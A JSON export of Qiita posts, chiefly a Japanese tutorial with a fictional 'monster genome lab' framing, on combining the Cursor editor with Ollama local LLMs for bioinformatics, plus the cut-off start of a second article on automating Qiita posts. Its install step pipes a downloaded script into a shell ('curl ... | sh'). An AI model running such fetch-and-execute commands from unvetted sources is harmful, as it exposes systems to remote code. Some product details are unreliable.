href=\"#-%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE%E3%83%AA%E3%83%B3%E3%82%AF%E9%9B%86\"><i class=\"fa fa-link\"></i></a>🔗 参考文献・リンク集</h2>\n<ul data-sourcepos=\"391:1-395:111\">\n<li data-sourcepos=\"391:1-391:70\">\n<strong>Cursor 公式サイト</strong>: <a href=\"https://cursor.sh/\" rel=\"nofollow noopener\" target=\"_blank\">https://cursor.sh/</a>\n</li>\n<li data-sourcepos=\"392:1-392:72\">\n<strong>Ollama 公式サイト</strong>: <a href=\"https://ollama.com/\" rel=\"nofollow noopener\" target=\"_blank\">https://ollama.com/</a>\n</li>\n<li data-sourcepos=\"393:1-393:84\">\n<strong>Ollama Model Library</strong>: <a href=\"https://ollama.com/library\" rel=\"nofollow noopener\" target=\"_blank\">https://ollama.com/library</a>\n</li>\n<li data-sourcepos=\"394:1-394:73\">\n<strong>Biopython Project</strong>: <a href=\"https://biopython.org/\" rel=\"nofollow noopener\" target=\"_blank\">https://biopython.org/</a>\n</li>\n<li data-sourcepos=\"395:1-395:111\">\n<strong>Jupyter AI (GitHub)</strong>: <a href=\"https://github.com/jupyter-ai/jupyter-ai\" rel=\"nofollow noopener\" target=\"_blank\">https://github.com/jupyter-ai/jupyter-ai</a>\n</li>\n</ul>\n",
      "body": "---\n\n> **対象読者**  \n> - 日々のコーディングやデータ解析を効率化したいエンジニア・研究者\n> - GitHub Copilotの次に試すAIツールを探している方\n> - バイオインフォマティクスに興味があり、AIをどう活用できるか知りたい方\n> - 機密性の高いデータを扱うため、クラウドAIの利用に懸念がある方\n\n> **動作確認環境 / 前提条件**  \n> - OS: macOS Sonoma (Apple M1) / Ubuntu 22.04\n> - Cursor: 0.33.1\n> - Ollama: 0.1.43\n> - Python: 3.10+\n> - Dockerが利用可能な環境（推奨）\n> - 기본적인コマンドライン操作、Pythonプログラミングの知識\n\n> **この記事で得られること（3点程度）**\n> 1. AIネイティブエディタ「Cursor」の基本的な使い方と、開発効率を上げるための活用法\n> 2. ローカル環境で大規模言語モデル（LLM）を動かすツール「Ollama」のセットアップと利用方法\n> 3. クラウドAIとローカルLLMを使い分ける、セキュリティと利便性を両立した「ハイブリッドAI解析環境」の構築ノウハウ\n\n---\n\n## 🧭 導入：背景・課題・なぜ重要か\n\nGEM Lab（遺伝生態モンスター研究所）の調査員として、我々は日々、未知のモンスター生命体から得られる膨大なゲノムデータと格闘しています。シーケンサーから出力されるテラバイト級のデータを処理し、生命の謎に迫る…聞こえは良いですが、その実態は地道な作業の連続です。解析パイプラインの構築、バグだらけのスクリプトのデバッグ、そして山のような結果の可視化。正直、解析の本質的な部分にたどり着く前に、力尽きてしまうこともしばしばです。\n\n以前の記事では、GitHub Actionsを使って調査報告（Qiita記事）の投稿を自動化し、「報告」の効率化を図りました。\n\n- [【ハマりどころ満載】PythonでQiita記事投稿を自動化するパイプライン構築で爆速改善！](https://qiita.com/cocokara_bioinfo/items/4bd415ef2f801497951e)\n- [Python × GitHub Actions で始める！Qiita 自動投稿パイプライン構築術](https://qiita.com/cocokara_bioinfo/items/7440c80d8e6a98177957)\n\nしかし、今回はさらに踏み込み、**「解析」そのものをAIの力で加速させる**ための開発・解析環境についてご紹介します。\n\nGitHub Copilotは既に多くの開発者にとって手放せないツールとなりましたが、時々「もっと文脈を理解してくれたら…」「このプロジェクト全体のことを分かってくれた上で提案してほしい…」と感じることはないでしょうか？\n\nこの記事では、単なるコード補完ツールを超え、開発者の「思考のパートナー」となるAI駆動の開発環境を構築する方法を解説します。具体的には、AIネイティブエディタ**Cursor**と、ローカル環境でLLMを動かす**Ollama**を組み合わせ、利便性とセキュリティを両立させたハイブリッド環境を目指します。この環境があれば、複雑なモンスターの遺伝子解析も、もっと速く、もっと創造的に進められるはずです。\n\n---\n\n## 📘 トピックの概要（専門外にも分かる説明）\n\n### AI駆動開発環境とは？\n\n「AI駆動開発環境」とは、AI（特に大規模言語モデル, LLM）が開発ワークフローのあらゆる側面に深く統合された環境のことです。これは、単にコードを補完する（Code Completion）だけではありません。\n\n- **対話型コーディング**: チャット形式でAIに指示し、コードを生成・修正・リファクタリングする。\n- **コンテキスト理解**: 開いているファイルだけでなく、プロジェクト全体のコードベースやドキュメントをAIが理解し、より的確な提案を行う。\n- **デバッグ支援**: エラーメッセージをAIに貼り付けるだけで、原因の特定や修正案を提示してくれる。\n- **ドキュメント生成**: 既存のコードから仕様書やコメントを自動で生成する。\n\n### なぜバイオインフォマティクスで重要なのか？\n\nバイオインフォマティクスの世界は、専門的なツールやライブラリ（例: Biopython, Samtools, GATK）、そして複雑なデータフォーマット（FASTA, FASTQ, BAM, VCF）に溢れています。\n\n- **学習コストの削減**: 「このライブラリでVCFファイルをパースするにはどう書けば？」といった初歩的な問いにAIが即座に答えてくれるため、学習コストを大幅に削減できます。\n- **定型作業の自動化**: 塩基配列のクリーニングやフォーマット変換など、頻繁に発生する定型的な前処理スクリプトをAIに一瞬で生成させることができます。\n- **解析の再現性向上**: AIに依頼して、解析手順をドキュメント化したり、Jupyter Notebookに適切なマークダウン説明を追加したりすることで、解析の再現性を高められます。\n\n### 今回構築する「ハイブリッドAI解析環境」\n\nこの記事で提案するのは、クラウドベースの強力なAIと、手元のマシンで動くセキュアなAIを組み合わせた「ハイブリッド環境」です。\n\n[文章で図解イメージ案]\n```\n+-------------------------------------------------------------+\n|                     開発者 (GEM Lab 調査員)                   |\n+-------------------------------------------------------------+\n      |                                      |\n      | エディタ上で対話・コーディング         |\n      |                                      |\n+-------------------------------------------------------------+\n|                 Cursor (AIネイティブエディタ)                 |\n+-------------------------------------------------------------+\n      |                                      |\n      | (1) 一般的な質問/コード生成          | (2) 機密情報を含むコードの相談\n      | (インターネット経由)                 | (ローカルネットワーク内)\n      |                                      |\n+--------------------------+         +-------------------------+\n|   クラウドAI (GPT-4など)   |         |  ローカルLLM (Ollama)   |\n| (OpenAI API)             |         | (Llama3, CodeLlamaなど) |\n+--------------------------+         +-------------------------+\n                                           ^\n                                           |\n                               +-----------------------------+\n                               | モンスター遺伝子データ (機密) |\n                               +-----------------------------+\n```\n\nこのアーキテクチャのポイントは、**扱う情報に応じてAIを使い分ける**点です。\n1.  **クラウドAI (Cursor経由)**: 一般的なアルゴリズムの相談や、公開されているライブラリの使い方など、機密情報を含まないタスクに使用します。最新かつ非常に高性能なモデル（GPT-4など）の能力を最大限に活用できます。\n2.  **ローカルLLM (Ollama)**: モンスターの遺伝子配列など、絶対に外部に送信できない機密データを含むコードのデバッグや解析ロジックの相談に使用します。これにより、セキュリティを確保しつつAIの支援を受けられます。\n\n---\n\n## 🔧 技術的な仕組み・実装・アーキテクチャ\n\n### 1. AIネイティブエディタ「Cursor」\n\n**Cursorとは？**\n[Cursor](https://cursor.sh/)は、VSCodeをフォークして開発された、AI機能を第一に考えて設計されたコードエディタです。VSCodeの拡張機能エコシステムをそのまま利用できるため、既存のVSCodeユーザーはスムーズに移行できます。\n\n**なぜVSCode + CopilotではなくCursorなのか？**\n- **深いコンテキスト理解**: `@`シンボルを使って、特定のファイル（`@file.py`）やドキュメント（`@docs`）をAIのコンテキストに含めることができます。これにより、「このファイルの実装を参考にして、新しい関数を作って」といった、より精度の高い指示が可能になります。\n- **インラインでの編集・チャット**: コードを選択して`Cmd+K`（Windows/Linuxでは`Ctrl+K`）を押すだけで、その場でAIと対話し、コードを直接編集させることができます。エディタとチャットウィンドウを行き来する必要がありません。\n- **AIによるリファクタリング**: 「この関数の変数名を分かりやすくして」「このクラスにテストコードを書いて」といったリファクタリング作業をAIに一任できます。\n\n**メリット／デメリット**\n- **メリット**: 開発速度が劇的に向上する。複雑なコードベースの理解が容易になる。AIとの対話がシームレス。\n- **デメリット**: デフォルトではCursorのサーバーを経由してOpenAIのAPIを利用するため、プライバシーポリシーの確認が必要。一部機能は有料。\n\n**初心者がつまずくポイント**\nプロンプトの書き方に少しコツが必要です。ただ「〇〇して」と書くのではなく、「あなたは経験豊富なバイオインフォマティシャンです。Biopythonを使って、FASTAファイルからGC含量を計算する関数を書いてください。エラーハンドリングも考慮してください。」のように、**役割（ペルソナ）、文脈、詳細な要件**を伝えることで、生成されるコードの質が格段に向上します。\n\n### 2. ローカルLLM実行環境「Ollama」\n\n**Ollamaとは？**\n[Ollama](https://ollama.com/)は、Llama 3, Code Llama, MistralといったオープンソースのLLMを、自分のPC上で驚くほど簡単に実行できるようにするツールです。複雑な環境構築は不要で、数個のコマンドを打つだけで準備が完了します。\n\n**なぜローカルLLMが必要なのか？**\n最大の理由は**セキュリティ**です。GEM Labが扱うモンスターの遺伝子情報は最高機密事項。これを外部のAPIに送信することは絶対に許されません。Ollamaを使えば、全ての処理がローカルマシン内で完結するため、情報漏洩のリスクをゼロにできます。オフライン環境でも動作するのも大きな利点です。\n\n**メリット／デメリット**\n- **メリット**: 高いセキュリティとプライバシー。オフライン利用可能。API利用料がかからない。\n- **デメリット**: 高性能なモデルを動かすには、相応のマシンスペック（特にメモリとGPU）が必要。クラウドの最新モデル（GPT-4oなど）と比較すると性能が劣る場合がある。\n\n**初心者がつまずくポイント**\n- **メモリ不足**: 大規模なモデルを実行しようとすると、メモリ不足で動作が遅くなったり、エラーが発生したりします。まずは`llama3:8b`（80億パラメータ）のような比較的小さなモデルから試すのがおすすめです。\n- **モデルの選択**: 用途に応じてモデルを選ぶ必要があります。コーディング支援なら`codellama`、汎用的な対話なら`llama3`、日本語性能を重視するなら`gemma:7b`など、様々な選択肢があります。Ollamaの[ライブラリページ](https://ollama.com/library)で探してみましょう。\n\n---\n\n## 🧪 実践編：動くコード／コマンド例\n\n### 1. 環境構築\n\n#### a. Cursorのインストール\n1.  [公式サイト](https://cursor.sh/)にアクセスし、お使いのOS用のインストーラをダウンロードします。\n2.  ダウンロードしたファイルを実行し、アプリケーションをインストールします。\n3.  起動するとVSCodeと非常によく似た画面が表示されます。既存のVSCode設定や拡張機能もインポートできます。\n\n#### b. Ollamaのインストールとセットアップ\n\n**macOS / Linux の場合:**\n```bash\n# 公式サイトのインストールスクリプトを実行\ncurl -fsSL https://ollama.com/install.sh | sh\n```\n\n**Windows の場合:**\n[公式サイト](https://ollama.com/download)からインストーラをダウンロードして実行します。\n\n**Llama 3 (8B) モデルのダウンロード:**\nインストール後、ターミナルで以下のコマンドを実行します。モデルのダウンロードが始まります（数GBあります）。\n\n```bash\n# Llama 3 (8B) instructモデルをプル\nollama pull llama3:8b\n\n# 成功ログの例\n# pulling manifest\n# pulling 2ab3b58f9049... 100% ▕██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████- 4.7g/s 4.7 GB\n# success\n```\n\n### 2. CursorによるクラウドAI活用例\n\nここでは、一般的なバイオインフォマティクスのタスクをCursorに依頼してみます。\n\n**シナリオ:** `monster_sequences.fasta` というFASTA形式のファイルから、特定のID (`MONSTER_007`) を持つ配列を抽出するPythonスクリプトを作成します。\n\n1.  `main.py` という空のファイルを作成します。\n2.  `Cmd+L` (Windows/Linux: `Ctrl+L`) でチャットウィンドウを開き、以下のプロンプトを入力します。\n    ```\n    あなたは熟練のPythonプログラマです。\n    Biopythonライブラリを使って、FASTAファイルから特定のIDを持つシーケンスを抽出するコマンドラインツールを作成してください。\n\n    要件：\n    - 入力ファイルパスとシーケンスIDを引数として受け取ること。\n    - 該当するIDが見つかった場合は、そのシーケンスを標準出力に出力すること。\n    - 見つからなかった場合は、エラーメッセージを出力すること。\n    - argparseを使って、使いやすいインターフェースにすること。\n    ```\n3.  AIがコードを生成します。以下はその一例です。\n\n```python\n# main.py (AIが生成したコード)\nimport argparse\nfrom Bio import SeqIO\nimport sys\n\ndef extract_sequence_by_id(fasta_file, sequence_id):\n    \"\"\"\n    Extracts a sequence from a FASTA file by its ID.\n\n    Args:\n        fasta_file (str): Path to the input FASTA file.\n        sequence_id (str): The ID of the sequence to extract.\n\n    Returns:\n        Bio.SeqRecord.SeqRecord or None: The found sequence record, or None if not found.\n    \"\"\"\n    try:\n        for record in SeqIO.parse(fasta_file, \"fasta\"):\n            if record.id == sequence_id:\n                return record\n        return None\n    except FileNotFoundError:\n        print(f\"Error: The file '{fasta_file}' was not found.\", file=sys.stderr)\n        return None\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"Extract a specific sequence from a FASTA file.\")\n    parser.add_argument(\"fasta_file\", help=\"Path to the input FASTA file.\")\n    parser.add_argument(\"sequence_id\", help=\"The ID of the sequence to extract.\")\n    args = parser.parse_args()\n\n    found_record = extract_sequence_by_id(args.fasta_file, args.sequence_id)\n\n    if found_record:\n        print(f\">{found_record.description}\")\n        print(found_record.seq)\n    else:\n        print(f\"Sequence with ID '{args.sequence_id}' not found in '{args.fasta_file}'.\", file=sys.stderr)\n        sys.exit(1)\n\nif __name__ == \"__main__\":\n    main()\n```\n\n4.  次に、このコードをリファクタリングしてみましょう。`extract_sequence_by_id`関数を選択して`Cmd+K` (Ctrl+K) を押し、こう指示します。\n    `この関数に型ヒントを追加し、docstringをGoogleスタイルに変更してください。`\n\nすると、AIが即座にコードを以下のように書き換えてくれます。\n\n```python\n# main.py (リファクタリング後のコード)\nimport argparse\nfrom Bio import SeqIO\nfrom Bio.SeqRecord import SeqRecord\nimport sys\nfrom typing import Optional\n\ndef extract_sequence_by_id(fasta_file: str, sequence_id: str) -> Optional[SeqRecord]:\n    \"\"\"Extracts a sequence from a FASTA file by its ID.\n\n    Args:\n        fasta_file (str): Path to the input FASTA file.\n        sequence_id (str): The ID of the sequence to extract.\n\n    Returns:\n        Optional[SeqRecord]: The found sequence record, or None if not found or\n                             if the file does not exist.\n    \"\"\"\n    try:\n        for record in SeqIO.parse(fasta_file, \"fasta\"):\n            if record.id == sequence_id:\n                return record\n        return None\n    except FileNotFoundError:\n        print(f\"Error: The file '{fasta_file}' was not found.\", file=sys.stderr)\n        return None\n\n# (main関数は変更なし)\n...\n```\n\nこのように、対話的にコーディングとリファクタリングを進めることができます。\n\n### 3. OllamaによるローカルLLM活用例\n\n**シナリオ:** モンスターの機密ゲノムデータ（という想定のダミーデータ）を含むスクリプトのデバッグを、情報を外部に送らずに行います。\n\n1.  まず、ターミナルでOllamaの対話モードを開始します。\n    ```bash\n    ollama run llama3:8b\n    ```\n    ```\n    >>>\n    ```\n    とプロンプトが表示され、入力待機状態になります。\n\n2.  ここに、デバッグしたいコードに関する質問を貼り付けます。**機密データそのものではなく、コードのロジックに関する質問をすることがポイントです。**\n\n    **プロンプト例:**\n    ```\n    Pythonのコードについて質問です。\n    `data`という文字列があり、ここには'A', 'T', 'G', 'C'以外の文字（例えば'N'）が含まれている可能性があります。\n    この文字列から'N'の数を数えるコードを書いていますが、`data.count('N')`よりも効率的な方法はありますか？\n    データは非常に長くなる可能性があります（数ギガバイト）。\n    ```\n    \n    **Ollama (Llama 3) からの回答例:**\n    ```\n    こんにちは！興味深い質問ですね。巨大な文字列で特定の文字を数える場合、パフォーマンスは重要になります。\n\n    `data.count('N')`はシンプルで読みやすいですが、PythonのC言語実装レベルで最適化されており、非常に高速です。ほとんどの場合、これで十分です。\n\n    しかし、メモリ効率をさらに考慮する場合や、文字列を一度にメモリにロードできない場合は、ジェネレータ式やイテレータを使うアプローチが考えられます。\n\n    例えば、ファイルを一行ずつ読み込んで処理する場合：\n\n    ```python\n    def count_char_in_file(filepath, char_to_count):\n        count = 0\n        with open(filepath, 'r') as f:\n            for line in f:\n                count += line.count(char_to_count)\n        return count\n\n    # 使い方\n    # n_count = count_char_in_file('huge_genome_file.txt', 'N')\n    # print(f\"The character 'N' appears {n_count} times.\")\n    ```\n\n    この方法は、ファイル全体を一度にメモリに読み込まないため、巨大なファイルに対してもメモリ効率が良いです。\n\n    もし文字列がすでにメモリ上にあるが、他の処理と並行してカウントしたい場合は、単純なループも考えられます。\n\n    ```python\n    data = \"ATGCGNATGC...\" # 巨大な文字列と仮定\n    n_count = sum(1 for char in data if char == 'N')\n    ```\n\n    このジェネレータ式を使った方法は、`count()`メソッドとパフォーマンス的には大差ないことが多いですが、より複雑な条件（例：'N'または'n'を数える）を追加するのが容易です。\n\n    結論として、シンプルさで言えば`data.count('N')`が最善です。メモリが懸念される巨大なファイルの場合は、ファイルをチャンクまたは行ごとに読み込むアプローチをお勧めします。\n    ```\n\nこのように、ローカル環境で完結させながら、具体的なコードの改善案や代替案を得ることができます。\n\n### 4. ハイブリッド戦略の実践: CursorからローカルLLMを呼び出す\n\nCursorの真価は、使用するAIモデルを柔軟に切り替えられる点にあります。\n\n1.  Cursorで `Cmd+,` (Ctrl+,) を押して設定を開きます。\n2.  \"Models\" を検索し、\"Model Provider\" のセクションを見つけます。\n3.  \"Add a new model...\" をクリックし、\"Ollama\" を選択します。\n4.  設定で、使用したいモデル名（例: `llama3:8b`）を入力します。\n5.  これで、チャットウィンドウやインライン編集時に、モデル選択ドロップダウンから`Ollama/llama3:8b`を選べるようになります。\n\nこれにより、「この一般的な関数はGPT-4で生成し、この機密データに触れる部分のデバッグはローカルのLlama 3で」といった使い分けが、同じエディタ内でシームレスに実現できます。\n\n---\n\n## 🚀 応用・発展・実用例\n\nこのハイブリッドAI解析環境は、様々な場面で応用できます。\n\n- **新規パイプラインの設計**: NextflowやSnakemakeのようなワークフロー言語のボイラープレートをAIに生成させ、迅速にパイプラインの骨格を作ることができます。「Snakemakeを使って、FASTQファイルをTrimmomaticでトリミングし、BWAでマッピングするルールの雛形を書いて」といった指示が有効です。\n- **データ可視化の高速化**: MatplotlibやSeabornを使った複雑なグラフ（例: 火山プロット、クラスタリングのヒートマップ）の描画コードをAIに生成させ、自分はデータの解釈に集中できます。\n- **他技術との統合**:\n    - **Docker**: `Dockerfile`の作成や最適化をAIに相談できます。「Python 3.10ベースで、BiopythonとPandasをインストールするDockerfileを書いて」と依頼すれば、すぐに雛形が手に入ります。\n    - **Jupyter**: データ探索フェーズでは、Jupyter Lab内で[Jupyter AI](https://github.com/jupyter-ai/jupyter-ai)拡張機能を使うことで、ノートブック上で直接LLMと対話し、コードセルを生成させることが可能です。\n- **モンスター生命体の解析への応用**:\n    - 未知の遺伝子配列が与えられた際、「この配列に似た機能を持つ既知の遺伝子をBLASTで検索するためのBiopythonスクリプトを書いて」とCursorに依頼する。\n    - 発見された新種モンスターのゲノムアセンブリ結果（機密）について、「このアセンブリ結果に含まれるコンティグのN50を計算するPythonスクリプトを、メモリ効率を考慮して書いて」とOllamaに相談する。\n\n---\n\n## 📝 まとめ（Takeaways）\n\nこの記事で紹介した「ハイブリッドAI解析環境」の重要なポイントをまとめます。\n\n- **AIは「相棒」**: AI駆動開発は、単なるコード補完ではなく、設計・実装・デバッグ・ドキュメント化の全工程を支援する強力なパートナーです。\n- **Cursorで開発を加速**: AIネイティブエディタCursorは、深いコンテキスト理解とシームレスな対話機能により、開発体験を次のレベルに引き上げます。\n- **Ollamaでセキュリティを確保**: 機密データを扱う際は、Ollamaを使ってローカル環境でLLMを実行することで、情報漏洩のリスクなくAIの恩恵を受けられます。\n- **ハイブリッドが最適解**: クラウドAIの性能とローカルLLMのセキュリティを使い分ける「ハイブリッド戦略」が、現代の多くの開発・解析業務において現実的かつ強力なソリューションです。\n- **まずは試すことから**: CursorとOllamaのインストールは非常に簡単です。まずは手元のPCに導入し、日々のちょっとした作業からAIに任せてみることをお勧めします。\n\n---\n\n## ❓ FAQ（読者が抱きそうな疑問と回答）\n\n**Q1: マシンスペックが低いPCでもローカルLLMは使えますか？**\nA1: はい、使えますがモデルの選択が重要になります。Ollamaは比較的軽量ですが、快適な動作には16GB以上のRAMを推奨します。もし動作が重い場合は、`llama3:8b`よりもさらに小さいモデル、例えば`tinydolphin`や`qwen:4b`などを試してみてください。これらは性能は少し落ちますが、要求スペックは低くなります。\n\n**Q2: Cursorは無料ですか？ 有料プランとの違いは何ですか？**\nA2: Cursorには無料枠があります。無料枠では、GPT-4などの高性能モデルを月に一定回数利用できます。回数制限を超えて利用したい場合や、より高度な機能（プロジェクト全体をAIに読み込ませる\"Auto-repo\"など）を使いたい場合は、有料プランへのアップグレードが必要です。ただし、Ollamaと連携してローカルLLMを使う分には、回数制限なく無料で利用できます。\n\n**Q3: AIが生成したコードの信頼性はどのように担保すればよいですか？**\nA3: 非常に重要な質問です。AIが生成したコードは**絶対に鵜呑みにしてはいけません**。それはあくまで「非常に優秀なアシスタントが書いた下書き」と捉えるべきです。特に、バイオインフォマティクスのような科学的な正確性が求められる分野では、以下の点を確認することが不可欠です。\n1.  **ロジックの検証**: 生成されたコードのアルゴリズムが、意図した解析手法と一致しているか必ず確認します。\n2.  **テスト**: 小さなダミーデータセットでコードを動かし、期待通りの結果が得られるかテストします。\n3.  **ライブラリのドキュメント参照**: 使用されている関数やオプションが適切か、公式ドキュメントで裏を取る習慣をつけましょう。\n\n---\n\n## 🔗 参考文献・リンク集\n\n- **Cursor 公式サイト**: [https://cursor.sh/](https://cursor.sh/)\n- **Ollama 公式サイト**: [https://ollama.com/](https://ollama.com/)\n- **Ollama Model Library**: [https://ollama.com/library](https://ollama.com/library)\n- **Biopython Project**: [https://biopython.org/](https://biopython.org/)\n- **Jupyter AI (GitHub)**: [https://github.com/jupyter-ai/jupyter-ai](https://github.com/jupyter-ai/jupyter-ai)\n",
      "coediting": false,
      "comments_count": 0,
      "created_at": "2025-12-05T18:21:34+09:00",
      "group": null,
      "id": "5ca46b45f0ba191895c9",
      "likes_count": 0,
      "private": false,
      "reactions_count": 0,
      "stocks_count": 0,
      "tags": [
        {
          "name": "Python",
          "versions": []
        },
        {
          "name": "自動化",
          "versions": []
        }
      ],
      "title": "AI駆動でモンスター遺伝子解析を加速！CursorとローカルLLMで作る次世代バイオインフォ環境",
      "updated_at": "2025-12-05T18:21:34+09:00",
      "url": "https://qiita.com/cocokara_bioinfo/items/5ca46b45f0ba191895c9",
      "user": {
        "description": "ポッケ村出身の名もなき若手生物学研究員です。\r\n現代の技術やエンジニア知識を学びながらモンスターハンターの生態・生物学研究に日々励んでおります！\r\nまだまだ勉強不足なところはありますが、皆さんに少しでも学びになるものをお届けできればとの思いで発信させていただきます\r\n\r\n※フィクションとして、時にTips記事として楽しんでいただければ幸いです",
        "facebook_id": "",
        "followees_count": 3,
        "followers_count": 0,
        "github_login_name": null,
        "id": "cocokara_bioinfo",
        "items_count": 4,
        "linkedin_id": "",
        "location": "",
        "name": "シャル・S 調査員",
        "organization": "Genome & Ecology Monster-Lab (架空)",
        "permanent_id": 4288059,
        "profile_image_url": "https://lh3.googleusercontent.com/a/ACg8ocLkgrrRuDzozKQ4XeInetzc0um1rPWRGXY2daT9pLIi1z1JdQ=s96-c",
        "team_only": false,
        "twitter_screen_name": null,
        "website_url": ""
      },
      "page_views_count": 135,
      "team_membership": null,
      "organization_url_name": null,
      "slide": false,
      "_source": "my_popular"
    },
    {
      "rendered_body": "<blockquote data-sourcepos=\"1:1-2:126\">\n<p data-sourcepos=\"1:3-2:126\"><strong>対象読者</strong><br>\nPython をある程度書けるエンジニア、GitHub Actions に興味がある方、Qiita 投稿を効率化したい方</p>\n</blockquote>\n<blockquote data-sourcepos=\"4:1-9:26\">\n<p data-sourcepos=\"4:3-4:41\"><strong>動作確認環境 / 前提条件</strong></p>\n<ul data-sourcepos=\"5:3-9:26\">\n<li data-sourcepos=\"5:3-5:27\">macOS Monterey (12.6.3)</li>\n<li data-sourcepos=\"6:3-6:14\">Python 3.9</li>\n<li data-sourcepos=\"7:3-7:12\">pip 23.0</li>\n<li data-sourcepos=\"8:3-8:26\">GitHub アカウント</li>\n<li data-sourcepos=\"9:3-9:26\">Qiita API トークン</li>\n</ul>\n</blockquote>\n<blockquote data-sourcepos=\"11:1-14:65\">\n<p data-sourcepos=\"11:3-11:39\"><strong>この記事で得られること</strong></p>\n<ul data-sourcepos=\"12:3-14:65\">\n<li data-sourcepos=\"12:3-12:53\">Qiita API を利用した記事投稿の自動化</li>\n<li data-sourcepos=\"13:3-13:68\">GitHub Actions を利用した CI/CD パイプラインの構築</li>\n<li data-sourcepos=\"14:3-14:65\">Python スクリプトのテストとデプロイの自動化</li>\n</ul>\n</blockquote>\n<h2 data-sourcepos=\"16:1-16:50\">\n<span id=\"-導入背景課題なぜ重要か\" class=\"fragment\"></span><a href=\"#-%E5%B0%8E%E5%85%A5%E8%83%8C%E6%99%AF%E8%AA%B2%E9%A1%8C%E3%81%AA%E3%81%9C%E9%87%8D%E8%A6%81%E3%81%8B\"><i class=\"fa fa-link\"></i></a>🧭 導入：背景・課題・なぜ重要か</h2>\n<p data-sourcepos=\"18:1-18:307\">日々の業務や学習で得た知識を Qiita に投稿するのは、エンジニアにとって非常に有益な習慣です。しかし、「記事を書く時間がない」「投稿が面倒」といった理由で、せっかくの知識が埋もれてしまうことも少なくありません。</p>\n<p data-sourcepos=\"20:1-20:269\">そこで、この記事では <strong>Python と GitHub Actions を活用して、Qiita への記事投稿を自動化するパイプライン</strong> を構築します。これにより、記事作成に集中し、より多くの知識を共有できるようになります。</p>\n<p data-sourcepos=\"22:1-22:469\">以前の記事 <a href=\"https://qiita.com/cocokara_bioinfo/items/78b20fc5aff614e609e2\" id=\"reference-146fe97063490483165a\">使用例</a> では、Qiita 投稿の効率化について紹介しましたが、今回はさらに一歩進んで、完全に自動化されたパイプラインを構築します。この自動化によって、記事の作成から投稿までの一連のフローが劇的に改善され、より多くの時間を記事の質向上に費やすことができるようになります。</p>\n<h2 data-sourcepos=\"24:1-24:29\">\n<span id=\"-トピックの概要\" class=\"fragment\"></span><a href=\"#-%E3%83%88%E3%83%94%E3%83%83%E3%82%AF%E3%81%AE%E6%A6%82%E8%A6%81\"><i class=\"fa fa-link\"></i></a>📘 トピックの概要</h2>\n<p data-sourcepos=\"26:1-26:248\">今回のトピックは、<strong>Qiita API を利用した記事投稿の自動化</strong> です。Qiita API を利用することで、プログラムから Qiita に記事を投稿したり、既存の記事を更新したりすることができます。</p>\n<p data-sourcepos=\"28:1-28:323\"><strong>GitHub Actions</strong> は、GitHub 上で CI/CD (継続的インテグレーション/継続的デリバリー) パイプラインを構築するためのサービスです。GitHub リポジトリへのプッシュやプルリクエストをトリガーとして、自動的にテストやデプロイを実行できます。</p>\n<p data-sourcepos=\"30:1-30:69\">今回のパイプラインのイメージは以下の通りです。</p>\n<p data-sourcepos=\"32:1-32:35\"><strong>文章で図解イメージ案:</strong></p>\n<ol data-sourcepos=\"34:1-38:0\">\n<li data-sourcepos=\"34:1-34:82\">GitHub リポジトリに Markdown ファイル (Qiita 記事) をプッシュ</li>\n<li data-sourcepos=\"35:1-35:43\">GitHub Actions がプッシュを検知</li>\n<li data-sourcepos=\"36:1-36:109\">Python スクリプトが Markdown ファイルを読み込み、Qiita API を利用して記事を投稿</li>\n<li data-sourcepos=\"37:1-38:0\">投稿結果を GitHub Actions のログに出力</li>\n</ol>\n<p data-sourcepos=\"39:1-39:622\">バイオインフォマティクス分野では、大量のデータを解析し、その結果を共有する必要があります。この自動投稿パイプラインは、解析結果を Qiita で共有する際に非常に役立ちます。例えば、ある遺伝子セットに対する解析結果を自動的に Qiita に投稿し、他の研究者と共有することができます。これは、<strong>遺伝子配列という「文字列データ」</strong> 